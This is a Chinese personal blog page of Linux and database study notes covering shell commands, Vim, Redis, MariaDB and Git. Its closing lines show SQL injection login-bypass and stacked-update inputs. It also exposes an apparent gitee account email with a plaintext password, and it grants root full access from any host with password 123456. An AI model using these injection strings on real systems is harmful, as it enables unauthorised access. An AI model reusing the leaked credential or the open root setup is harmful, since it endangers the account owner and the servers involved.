<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="程序语言记录">
<meta property="og:type" content="website">
<meta property="og:title" content="PeacefulRace">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="PeacefulRace">
<meta property="og:description" content="程序语言记录">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Private">
<meta property="article:tag" content="python, 前端, 后端 ...">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>PeacefulRace</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">PeacefulRace</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">学习笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">10</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">25</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/Linux%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/Linux%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">linux基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-10-23 16:09:44" itemprop="dateModified" datetime="2022-10-23T16:09:44+08:00">2022-10-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1-Linux命令格式"><a href="#1-Linux命令格式" class="headerlink" title="1.Linux命令格式"></a>1.Linux命令格式</h1><p>命令名称 [命名参数] [命名对象]</p>
<h2 id="（1）获取登录信息-w-who-last"><a href="#（1）获取登录信息-w-who-last" class="headerlink" title="（1）获取登录信息-w/who/last"></a>（1）获取登录信息-w/who/last</h2><p>who am i – 获取当前用户信息</p>
<p>Logout/exit – 登出当前用户</p>
<p>w – 详细登录信息</p>
<p>last – 历史登录信息</p>
<h2 id="2-History-历史命令-c-清除历史"><a href="#2-History-历史命令-c-清除历史" class="headerlink" title="(2) History - 历史命令 -c 清除历史"></a>(2) History - 历史命令 -c 清除历史</h2><h2 id="3-Wget-通过网络获取文件"><a href="#3-Wget-通过网络获取文件" class="headerlink" title="(3) Wget - 通过网络获取文件"></a>(3) Wget - 通过网络获取文件</h2><p>-O 重命名下载的文件</p>
<p>例如：wget <a target="_blank" rel="noopener" href="https://www.python.org/ftp/python3.7.3/Python-3.7.3.tar.xz">https://www.python.org/ftp/python/python3.7.3/Python-3.7.3.tar.xz</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz</span><br><span class="line">tar -xvf Python-3.8.0a1.tgz</span><br></pre></td></tr></table></figure>

<p> wget <a target="_blank" rel="noopener" href="https://www.python.org/ftp/python3.7.3/Python-3.7.3.tar.xz">https://www.python.org/ftp/python/python3.7.3/Python-3.7.3.tgz</a></p>
<h2 id="4-Xz-z-压缩-d-解压缩"><a href="#4-Xz-z-压缩-d-解压缩" class="headerlink" title="(4) Xz -z 压缩 -d 解压缩"></a>(4) Xz -z 压缩 -d 解压缩</h2><h2 id="5-Tar-xvf解归档-cvf-创建归档文件"><a href="#5-Tar-xvf解归档-cvf-创建归档文件" class="headerlink" title="(5) Tar -xvf解归档 -cvf 创建归档文件"></a>(5) Tar -xvf解归档 -cvf 创建归档文件</h2><h2 id="6-Cat-n-添加行号-cat-n-taobao-html-more"><a href="#6-Cat-n-添加行号-cat-n-taobao-html-more" class="headerlink" title="(6) Cat -n 添加行号 cat -n taobao.html | more"></a>(6) Cat -n 添加行号 cat -n taobao.html | more</h2><h2 id="7-管道-将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）"><a href="#7-管道-将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）" class="headerlink" title="(7)  | 管道 - 将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）"></a>(7)  | 管道 - 将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）</h2><h2 id="8-2-gt-错误输出重定向"><a href="#8-2-gt-错误输出重定向" class="headerlink" title="(8) 2&gt; - 错误输出重定向"></a>(8) 2&gt; - 错误输出重定向</h2><h2 id="9-2-gt-gt-错误追加输出重定向"><a href="#9-2-gt-gt-错误追加输出重定向" class="headerlink" title="(9) 2&gt;&gt; - 错误追加输出重定向"></a>(9) 2&gt;&gt; - 错误追加输出重定向</h2><h2 id="10-Nginx-Web服务器（HTTP服务器）-反向代理服务器"><a href="#10-Nginx-Web服务器（HTTP服务器）-反向代理服务器" class="headerlink" title="(10) Nginx - Web服务器（HTTP服务器）/反向代理服务器"></a>(10) Nginx - Web服务器（HTTP服务器）/反向代理服务器</h2><p>nginx 启用</p>
<p>Nginx -s stop 停止</p>
<h2 id="11-Yum-list-installed-grep-nginx-–-grep查询字符串"><a href="#11-Yum-list-installed-grep-nginx-–-grep查询字符串" class="headerlink" title="(11) Yum list installed | grep nginx – grep查询字符串"></a>(11) Yum list installed | grep nginx – grep查询字符串</h2><h2 id="12-Yum-y-–自动同意所有询问"><a href="#12-Yum-y-–自动同意所有询问" class="headerlink" title="(12) Yum -y –自动同意所有询问"></a>(12) Yum -y –自动同意所有询问</h2><h2 id="13-Gcc-–version-C语言编译器"><a href="#13-Gcc-–version-C语言编译器" class="headerlink" title="(13) Gcc –version C语言编译器"></a>(13) Gcc –version C语言编译器</h2><h2 id="14-源代码构建安装Python解释器"><a href="#14-源代码构建安装Python解释器" class="headerlink" title="(14) 源代码构建安装Python解释器"></a>(14) 源代码构建安装Python解释器</h2><p>下载: wget <a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz">https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz</a></p>
<p>解压缩和解归档：xz -d xxx.xz/tar -xvf xxx.tar</p>
<p>补充依赖库：</p>
<p>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel</p>
<p>进入Python源代码目录安装前准备工作：</p>
<p>cd pythonxxx</p>
<p>./configure –prefix=usr/local/python38 –enable-optimizations</p>
<p>构建和安装：make &amp;&amp; make install</p>
<p>注册PATH环境变量：</p>
<p>Cd ~</p>
<p>Vim .bash_profile</p>
<p>PATH=…:/usr/local/python38/bin</p>
<p>激活环境变量：source .bash_profile</p>
<p>测试安装是否成功：python3 –version</p>
<p>创建链接：</p>
<p>- 硬链接：- ln /code/example01.py /root/xxx (给磁盘文件增加了新的引用，只要引用数不为0文件就不会消失)</p>
<p>- 软链接：- ln -s /usr/local/python38/bin/python3 /usr/bin/python3（相当于windows系统下的快捷方式）</p>
<h2 id="15-Ls-l长格式查看"><a href="#15-Ls-l长格式查看" class="headerlink" title="(15) Ls -l长格式查看"></a>(15) Ls -l长格式查看</h2><p>-rwxr-xr-x 当前文件r:可读w:可写x:可执行</p>
<h2 id="16-VIM编辑模式："><a href="#16-VIM编辑模式：" class="headerlink" title="(16) VIM编辑模式："></a>(16) VIM编辑模式：</h2><p>I/a: 编辑</p>
<p>Esc: 退出编辑–&gt;命令模式–&gt; :或/ 末行模式</p>
<p>:q 退出</p>
<p>:set nu 显示行号</p>
<p>:set nonu 去掉行号</p>
<p>:set ts=4 tab键占位数</p>
<p>Shift+zz/:wq ： 保存退出</p>
<p>:syntax on 高亮语法/颜色代码 off关掉</p>
<p>:set ruler 显示光标所在位置 set noruler关闭</p>
<p>命令模式下输入G移动光标到末尾，500G表示光标移动到第500行；gg - 移到开头</p>
<p>上下左右移动光标：hjkl -左下右上（前面可以加数字）</p>
<p>Ctrl+y/ctrl+e：移动一行</p>
<p>Ctrl+f/ctrl+b：翻一页</p>
<p>0/$：移到行首行尾</p>
<p>W: 移到下一个单词</p>
<p>dd: 光标所在行删除一行，100dd删除100行</p>
<p>yy: 复制光标所在行，10yy从所在行复制10行</p>
<p>P: 粘贴，5P粘贴5次</p>
<p>U: 撤销 / ctrl+R恢复</p>
<p>多文件操作：</p>
<p>:ls 显示所有同时打开的文件</p>
<p>:b 2 切换到第二个文件</p>
<p>:vs 垂直分屏</p>
<p>:sp 水平分屏</p>
<p>Ctrl+ww 切换分屏</p>
<p>:qa 退出所有分屏</p>
<p>:wqa 保存退出</p>
<p>Vim -d 文件1 文件2 - 打开多文件进行版本比较</p>
<p>映射快捷键：</p>
<p>- map <F2> gg9999dd 清空命令行</p>
<p>- inoremap _main if <strong>name</strong>== ‘__main__’:</p>
<h2 id="17-Alias-hao-’ls-laR’-把常用命令设置别名"><a href="#17-Alias-hao-’ls-laR’-把常用命令设置别名" class="headerlink" title="(17) Alias hao=’ls -laR’ 把常用命令设置别名"></a>(17) Alias hao=’ls -laR’ 把常用命令设置别名</h2><p>①   Unalias hao 取消别名</p>
<h2 id="18-宏操作："><a href="#18-宏操作：" class="headerlink" title="(18) 宏操作："></a>(18) 宏操作：</h2><p>录制宏：qa (a是寄存器的名字) - recording</p>
<p>结束录制：q</p>
<p>播放宏：@a</p>
<h2 id="19-查找和替换："><a href="#19-查找和替换：" class="headerlink" title="(19) 查找和替换："></a>(19) 查找和替换：</h2><p>查找 - ？或者/ - /idx - 支持正则</p>
<p>N / n - 正向搜索/反向搜索</p>
<p>替换 - :1,$s/idx/index/cgie</p>
<p> - c - confirm - 确认</p>
<p> - g - global - 全局(一行出现多出匹配全部找出)</p>
<p> - i - ignore case - 忽略大小写</p>
<p> - e - error - 忽略错误</p>
<h2 id="20-查找命令："><a href="#20-查找命令：" class="headerlink" title="(20) 查找命令："></a>(20) 查找命令：</h2><p> - grep - 搜索字符串(支持正则表达式)</p>
<p> - find - 搜索文件</p>
<p>-name - 根据名字搜索 - find / -name “*.html”</p>
<p>-size - 根据大小搜索 - -10M / +10M</p>
<p>-type - 根据类型搜索 - d / f / l / s</p>
<p>-atime - 最后访问时间</p>
<p>-mtime - 最后修改时间 - find . -mtime 0</p>
<p>-ctime - 创建时间</p>
<h2 id="21-网络相关命令："><a href="#21-网络相关命令：" class="headerlink" title="(21) 网络相关命令："></a>(21) 网络相关命令：</h2><p>- ssh - 安全远程连接 - 例如：ssh <a href="mailto:root@xx.xxx.xxx.xx(云服务器公网ip)">root@xx.xxx.xxx.xx(云服务器公网ip)</a></p>
<p>- scp - 安全文件拷贝 - 例如：scp -r /root/code <a href="mailto:root@xx.xxx.xxx.xx:/root/code">root@xx.xxx.xxx.xx:/root/code</a></p>
<p>- sftp - 安全文件传输（file transfer protocol）- 例如：sftp <a href="mailto:root@xx.xxx.xxx.xx">root@xx.xxx.xxx.xx</a></p>
<p>-put - 上传</p>
<p>-get - 下载</p>
<p>-bye - 退出</p>
<p>-help 查看帮助</p>
<p>-lls 本地列出文件</p>
<p>-ping - 检查网络可达性 - ICMP - Internet Control Management Protocol - 网络层</p>
<p> - ttl - time to live</p>
<p> - ping to death - DDoS - Distributed Deny of Service - 分布式拒绝服务攻击</p>
<p>-ifconfig / ip</p>
<p>- 127.0.0.1 - 回环地址 - localhost</p>
<p>-netstat</p>
<p>- netstat -nap | grep 进程或端口</p>
<p>-p - process - 查看进程信息（进程编号和进程名字）</p>
<p>- kill 进程号</p>
<h2 id="22-nginx启动停止重启服务："><a href="#22-nginx启动停止重启服务：" class="headerlink" title="(22) nginx启动停止重启服务："></a>(22) nginx启动停止重启服务：</h2><p>Service nginx start</p>
<p>Systemctl start nginx</p>
<p>Systemctl stop nginx</p>
<p>Systemctl restart nginx</p>
<p>Systemctl status nginx</p>
<p>Systemctl enable nginx - 开机自启</p>
<p>Systemctl disable nginx</p>
<h2 id="23-进程操作相关命令："><a href="#23-进程操作相关命令：" class="headerlink" title="(23) 进程操作相关命令："></a>(23) 进程操作相关命令：</h2><p>~命令+&amp; - 把命令放到后台运行</p>
<p>Ctrl+z - 把前台命令停止并放到后台运行</p>
<p>bg %编号 - 重新运行已停止的命令</p>
<p>~ ps - processes - 例如：ps -ef | grep redis | grep -v grep 不显示grep信息</p>
<p>~kill - 结束进程</p>
<p>~jobs - 查看后台运行或停止的进程</p>
<p>~fg - foreground - 将后台命令至于前台</p>
<p>~bg - background - 让命令在后台运行 ctl+z</p>
<p>~top - 任务管理器 q退出</p>
<h2 id="24-centos7-命令行界面上下翻页"><a href="#24-centos7-命令行界面上下翻页" class="headerlink" title="(24) centos7 命令行界面上下翻页:"></a>(24) centos7 命令行界面上下翻页:</h2><p>shift + pageup 上翻</p>
<p>shift + pagedown 下翻</p>
<h2 id="25-Linux下命令行中的复制和粘贴"><a href="#25-Linux下命令行中的复制和粘贴" class="headerlink" title="(25) Linux下命令行中的复制和粘贴:"></a>(25) Linux下命令行中的复制和粘贴:</h2><p>安装gpm：yum install -y gpm*</p>
<p>开启gpm服务：systemctl start gpm</p>
<p>按住鼠标左键，选中想要复制的内容，松开就完成复制，再在复制的位置按右键就完成粘贴。</p>
<h2 id="26-数据库："><a href="#26-数据库：" class="headerlink" title="(26) 数据库："></a>(26) 数据库：</h2><p>关系型数据库 - Oracle / MySQL / MariaDB - 二维表</p>
<p>非关系型数据库 - MongoDB / Redis / ElasticSearch - 文档数据库/KV数据库</p>
<p>Yum install -y mariadb mariadb-server</p>
<p>Mysqld - MySQL Daemon - 守护进程 </p>
<p>Rpm -ivh mysql-5.7.34-1.el7.x86_64.rpm</p>
<p>Rpm -e 擦除</p>
<p>Systemctl start mariadb - 启动mysql</p>
<p>Mysql -u root -p - 连接mysql</p>
<p>Use mysql</p>
<p>修改mysql密码</p>
<p>Update user set password=password(‘123456’) where user=’root’;</p>
<p>Flush privileges;</p>
<p>10.4版本以后：</p>
<p>select user, password, host from user; # 查询已有用户</p>
<p>SET PASSWORD FOR ‘bob‘@’%.loc.gov’ = PASSWORD(‘newpass’); # 根据用户及host修改密码</p>
<p>SET PASSWORD FOR ‘bob‘@localhost = PASSWORD(“”); # # 根据用户及host删除密码</p>
<p>delete from user where user=’XXX’ and host=’localhost’; ## 指定域及用户删除用户</p>
<p>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION; 创建一个用户能使用root从任何主机连接到mysql服务器。</p>
<p>—Redis数据库：</p>
<p><a target="_blank" rel="noopener" href="https://redis.io/">https://redis.io</a></p>
<p><a target="_blank" rel="noopener" href="https://redisdoc.com/">https://redisdoc.com</a> 使用手册</p>
<p>下载Radis:</p>
<p>Wget <a target="_blank" rel="noopener" href="https://download.redis.io/releases/redis-6.2.2.tar.gz?_ga=2.183820325.200813573.1619352920-1877153441.1619352920">https://download.redis.io/releases/redis-6.2.2.tar.gz?_ga=2.183820325.200813573.1619352920-1877153441.1619352920</a></p>
<p>解压缩解归档</p>
<p>安装：make &amp;&amp; make install</p>
<p>redis:编译时报错 /bin/sh: cc: command not found：</p>
<p>补依赖项：yum -y install gcc gcc-c++ libstdc++-devel</p>
<p>【Redis】编译错误zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory：</p>
<p>–make MALLOC=libc</p>
<p>–redis-server –version - 查看是否安装成功</p>
<p>–redis-sever &amp; - 启动redis服务(&amp;表示后台运行)</p>
<p>–netstat -nap | grep 6379或 ps -ef | grep redis | grep -v grep 或 jobs - 查看redis服务启动是否成功</p>
<p>–redis-server –requirepass 123456 &amp; - 带密码启动</p>
<p>–redis-cli - 客户端访问 - auth 123456 - 输密码</p>
<p>–redis-cli – 关闭redis</p>
<p>–shutdown</p>
<h2 id="27-安装和使用Git"><a href="#27-安装和使用Git" class="headerlink" title="(27) 安装和使用Git:"></a>(27) 安装和使用Git:</h2><p>​    Git官网：<a target="_blank" rel="noopener" href="http://git-scm.com/">http://git-scm.com/</a></p>
<p>点击Tarballs，右击选择复制所需文件的下载链接地址</p>
<p>Wget + 链接地址</p>
<p>解压缩： xz -d xxx.tar.xz</p>
<p>解归档：tar -xvf xxx.tar</p>
<p>安装依赖项：yum install libcurl-devel； yum install zlib-devel</p>
<p>安装GIT: ./configure –prefix=/usr/local/</p>
<p> Make $$ make install</p>
<p> Git –version</p>
<p>版本控制：</p>
<p>1990s - CVS / VSS - 锁定模式</p>
<p>2000 - Subversion(SVN) - 合并模式</p>
<p>必须有版本控制的中央服务器才能使用版本控制 - 中央集权型的版本控制系统</p>
<p>分布式版本控制系统 - 2005 - Git</p>
<p>Git / Mercury</p>
<p>—Git命令：</p>
<p>Git init - 将文件夹初始化为Git仓库</p>
<p>Git add xxxx - 添加文件到git仓库</p>
<p>Git status - 查看添加状态</p>
<p>Git add . - 添加当前目录所有文件</p>
<p>Git commit -m ‘提交说明’ - 提交命令</p>
<p>按提示设置账户默认ID</p>
<p>Git log - 查看日志</p>
<p>若使用 rm -f *误删除：git checkout – . 恢复所有文件</p>
<p>或使用 git log 查看commit一栏前6位作为ID</p>
<p>Git reset –hard <ID> - 回到指定版本</p>
<p>git reset –hard HEAD^ - 回到上一版本</p>
<p>Git reflog 查看已修改过版本</p>
<p>—国内代码托管平台：gitee /coding</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/">https://gitee.com</a> – account: <a href="mailto:1174185292@qq.com">1174185292@qq.com</a> Z110112WILOVEME</p>
<p><a target="_blank" rel="noopener" href="https://coding.net/">https://coding.net</a></p>
<p>Git clone <a target="_blank" rel="noopener" href="https://gitee.com/zwzwzw001/python001.git">https://gitee.com/zwzwzw001/python001.git</a> - 从网站克隆到本地</p>
<p>-git push - 将本地代码推到服务器</p>
<p>=git pull - 将服务器更新同步到本地</p>
<p> -git branch 分支管理</p>
<p>-git branch develop 创建名为“develop“分支</p>
<p>-git checkout 切换分支  / 代码还原  / 代码回滚</p>
<p>-git checkout -b develop 创建并切换到名为“develop“分支</p>
<p>-git remote 远程管理</p>
<p>-git diff 差异对比</p>
<p>-git difftool –tool=vimdiff</p>
<p>-git merge 合并</p>
<h2 id="28-centos不小心删除-root目录该如何解决"><a href="#28-centos不小心删除-root目录该如何解决" class="headerlink" title="(28) centos不小心删除/root目录该如何解决?"></a>(28) centos不小心删除/root目录该如何解决?</h2><p>1.直接创建/root目录；mkdir /root</p>
<p>2.复制/etc/skel/下的隐藏文件到/root目录下；cp /etc/skel/.bash* /root</p>
<p>3.重启即可</p>
<h2 id="29-数据库-数据的仓库-database-实现数据持久化和数据管理"><a href="#29-数据库-数据的仓库-database-实现数据持久化和数据管理" class="headerlink" title="(29) 数据库 - 数据的仓库 - database - 实现数据持久化和数据管理"></a>(29) 数据库 - 数据的仓库 - database - 实现数据持久化和数据管理</h2><p>持久化 - 将数据从内存转移到能够长久保存数据的存储介质的过程</p>
<p>保证数据的完整性和一致性</p>
<p>完整性：</p>
<p>\1. 实体完整性 - 每一个实体都是独一无二的，没有冗余 - 主键/唯一索引</p>
<p>\2. 参照完整性 - 外键</p>
<p>\3. 域完整性 - 录入的数据都是有效的数据 - 数据类型/数据长度/非空约束/默认值约束/检查约束</p>
<p>Alter table tb_score add constraint ck_score_scmark check (scmark between 0 and 100);</p>
<p>一致性：事务 - 要么全成功要么全失败，操作不可分割 - ACID特性</p>
<p>\1. A - Atomicity - 原子性 - 不可分割</p>
<p>\2. C - Consistency - 一致性 - 事务前后数据状态要一致</p>
<p>\3. I - Isolation - 隔离性 - 并发的多个事务不知道彼此的中间状态</p>
<p>\4. D - Duration - 持久性 - 事务完成后数据要做持久化</p>
<p>分类：关系型数据库(SQL)和非关系型数据库(NoSQL)</p>
<p>- 文档数据库 - MongoDB / ElasticSearch</p>
<p>- 键值对数据库 - Redis - 内存 - 单线程+异步I/O （多路I/O复用）</p>
<p>- 列族数据库</p>
<p>- 图数据库</p>
<p>计算密集型应用 - 多进程 + 多线程</p>
<p>I/O密集型应用 - 单线程 + 异步I/O (协程（微线程）)</p>
<p>2008年 - LLOOGG - log(日志)</p>
<p>MySQL - Redis - REmote DIctionary Server</p>
<p>Github / Twitter / Sina / </p>
<p>冷数据（不经常使用）/ 热数据（经常使用）</p>
<p>\1. 高速缓存服务（用户经常访问的数据从数据库搬到内存）</p>
<p>\2. 实时排行榜</p>
<p>\3. 投票点赞</p>
<p>\4. 消息队列</p>
<p>Yum install redis</p>
<p>源代码构建安装 make &amp;&amp; make install</p>
<p>Redis-server –port 1234 –requirepass 123456 –appendonly yes</p>
<p>Redis-server –requirepass 123456 &gt; redis.log&amp;</p>
<p>Redis-server 配置文件(redis.conf) &gt; redis.log &amp;</p>
<p>启动Redis客户端：</p>
<p>Redis-cli -h 主机IP地址 -p 端口（默认6379）</p>
<p>主机：端口&gt;auth 密码</p>
<p>主机：端口&gt;ping</p>
<p>&gt;keys *</p>
<p>&gt;type </p>
<p>Redis 命令参考 - <a target="_blank" rel="noopener" href="http://redisdoc.com/">http://redisdoc.com/</a></p>
<p>哈希存储 - 性能非常好的存储方案 – set(集合)</p>
<p>Obj — 哈希函数 —&gt; 哈希码（散列码） —&gt; 对象在内存中存储的位置</p>
<p>文件 —&gt; MD5 / SHA1 / SHA256 —&gt; 哈希码（数字指纹/签名）</p>
<p>哈希表</p>
<p>hmset stu1 id 1001 name xxx sex male te1 11323232xxx</p>
<p>Hget stu1 name</p>
<p>Hmget stu1 name sex tel</p>
<p>Hvals stu1</p>
<p>Hgetall stu1</p>
<p>Hdel stu1 tel </p>
<p>- Redis主从复制读写分离</p>
<p>Redis-server –slaveof [主ip] 6379 –masterauth 123456 &gt; redis.log &amp;</p>
<p>info replication # 查看主从复制信息exitexit</p>
<p>Slaveof no one</p>
<p>-Redis修复持久化文件的工具</p>
<p>-dump.rdb文件误删解决方法</p>
<p>redis-server –requirepass 123456 –appendonly yes &gt; redis.log &amp; # 生成.aof文件的保存方式</p>
<p>Redis-check-aof –fix appendonly.aof</p>
<p>Redis-check-rdb –fix dump.rdb</p>
<p>Tornado / Node.js</p>
<p>文件系统 / 层次数据库 / 网状数据库</p>
<p>- 关系型数据库：</p>
<p>- 理论基础：关系代数和集合论</p>
<p>-具体表象：用二维表来保存数据 - 学生表</p>
<p>=行：一条记录 - 一个学生的信息</p>
<p>-列：一个字段 - 学生的属性</p>
<p>-主键列：能够唯一标识一条记录的列，如学号</p>
<p>-编程语言：SQL - 结构化查询语言</p>
<p>- DDL - 数据定义语言 - create / drop / alter</p>
<p>- create database xxx default charset utf8mb4; - 创建名为xxx的数据库</p>
<p>- use school;</p>
<p>- show tables;</p>
<p>- create user ‘root’@’%’ identified by ‘123456’; 添加访问权限</p>
<p>- flush privileges</p>
<p>- grant all privileges on <em>.</em> to ‘root’@’%’ with grant option; 允许所有客户端连接</p>
<p>- flush privileges</p>
<p>- drop database if exists xxx - 删除xxx数据库</p>
<p>- ？ data types - 查看数据类型</p>
<p>- ？ int - int类型描述</p>
<p>- DML - 数据操作语言 - insert / delete / update / select</p>
<p>- DCL - 数据控制语言 - grant / revoke</p>
<p>-产品：Oracle - 甲骨文</p>
<p>IBM DB2</p>
<p>Microsoft SQLServer</p>
<p>Sybase</p>
<p>MySQL</p>
<p>PostgreSQL</p>
<p>SQLite</p>
<p>学生（学号、姓名、性别、生日、家庭住址）</p>
<p>学院（编号、名称、网址、。。。。）</p>
<p>插入不少于3条学院记录</p>
<p>实体：学生、学院</p>
<p>关系：属于</p>
<p>重数：多对一</p>
<p>– 一对一重数关系</p>
<p>create table tb_person</p>
<p>(</p>
<p>pid int auto_increment,</p>
<p>pname varchar(50),</p>
<p>primary key (pid)</p>
<p>);</p>
<p>create table tb_idcard</p>
<p>(</p>
<p>cid int auto_increment,</p>
<p>cno char(18) not null,</p>
<p>ps varchar(255) not null,</p>
<p>expire date not null,</p>
<p>pid int not null,</p>
<p>PRIMARY key (cid)</p>
<p>);</p>
<p>alter table tb_idcard add CONSTRAINT fk_card_pid foreign key (pid) REFERENCES tb_person (pid);</p>
<p>– 一对一是多对一的特例，加上唯一性约束</p>
<p>alter table tb_idcard add CONSTRAINT uni_card_pid unique (pid);</p>
<p>–SQL注射攻击：</p>
<p>tb_user</p>
<p>Userid    username     userpass …</p>
<p>1          admin        123456</p>
<p>select * from tb_user where username=’%s’ and password=’%s’</p>
<p>Username=admin</p>
<p>Password=’x’ or ‘1’=’1’</p>
<p>‘; update … where ‘1’ = ‘1’</p>
